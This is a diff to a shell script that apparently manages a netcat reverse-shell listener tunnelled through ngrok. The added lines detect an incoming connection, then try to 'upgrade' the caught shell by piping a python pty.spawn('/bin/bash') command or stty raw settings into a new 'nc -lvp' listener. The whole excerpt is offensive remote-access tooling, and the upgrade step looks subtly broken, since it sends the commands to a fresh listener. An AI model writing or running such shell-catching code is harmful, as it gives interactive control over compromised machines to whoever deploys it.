@@ -39,6 +39,18 @@ done
 while true; do
     if netstat -ant | grep -q $port && ! pgrep -x nc > /dev/null; then
         pkill ngrok
+        
+        # Try to upgrade the shell
+        if type python > /dev/null 2>&1; then
+            echo -e "\e[1mUpgrading the shell using Python...\e[0m"
+            echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" | nc -lvp $port &
+        else
+            echo -e "\e[1mUpgrading the shell using stty...\e[0m"
+            echo "stty raw -echo; reset; export SHELL=bash; export TERM=xterm-256color; stty rows $(tput lines) columns $(tput cols)" | nc -lvp $port &
+        fi
+        
+        # Kill the listener process
+        pkill -P $$ 
         exit 0
     fi
     sleep 1
